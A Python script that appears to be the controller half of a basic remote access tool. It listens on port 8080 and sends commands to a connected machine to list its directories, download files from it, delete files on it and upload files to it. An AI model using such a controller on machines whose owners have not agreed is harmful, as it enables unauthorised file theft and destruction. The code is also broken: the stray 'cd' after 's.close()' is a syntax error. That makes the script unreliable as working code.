# Available Commands:
# - view_cwd        [Show all Files in Current Dir]
# - custom_dir      [Show all Files in Custom Dir]
# - download_files  [Download Files]
# - delete_files    [Delete Files and Folders]
# - send_files      [Upload Files]
# - quit            [It's Obvious! Quits the Script]


import os
import socket
import sys

# Connection Initialisation [Phase 1]
s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
print("")
print("[+] Server is running at " + host)
print("")
print("[+] Waiting for Incoming Connections...")
s.listen(1)
conn, addr = s.accept()
print("")
print("[+]" + str(addr) + "has Connected to the Server")

# Command Handling [Phase 2]
while 1:
    command=input(str("Command >> "))
    if command == "view_cwd": # To view files from Current Working Directory.
        conn.send(command.encode())
        print("")
        print("[+] Command has been sent. Waiting for Execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command Output : " + files)
        print("")

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = str(input("Enter the Custom Dir : ")) # To view files on Custom Directory
        conn.send(user_input.encode())
        print("")
        print("[+] Command has been Sent. Waiting for Execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("[+] Command Output : " + files)
        print("")

    elif command == "download_files":
        conn.send(command.encode())
        user_input = str(input("Enter the File Link (remote) : "))
        conn.send(user_input.encode())
        print("[+] Command has been Sent. Waiting for Execution")
        print("")
        file_data = conn.recv(20000)
        filename = str(input("Enter the Filename for the Incoming File (with ext) : "))
        new_file = open(filename, 'wb')
        new_file.write(file_data)
        new_file.close()
        print("[+] The File(s) has been Downloaded Successfully")
        print("")

    elif command == "delete_files":
        conn.send(command.encode())
        user_input = str(input("Enter the File Link (local) : "))
        conn.send(user_input.encode())
        print("[+] File Deleted")
        print("")

    elif command == "send_files":
        conn.send(command.encode())
        user_input  = str(input("Enter the File Link (local) : "))
        user_input2 = str(input("Enter the Filename to be saved remotely : "))
        file = open(user_input, 'rb')
        file_data = file.read()
        file.close()
        conn.send(file_data)
        conn.send(user_input2.encode())
        print("")
        print("[+] File(s) has been Sent.")

    elif command == "quit":
        conn.close()
        s.close()cd
        sys.exit()

    else:
        print("")
        print("[-] Command not Recognised")
        print("")
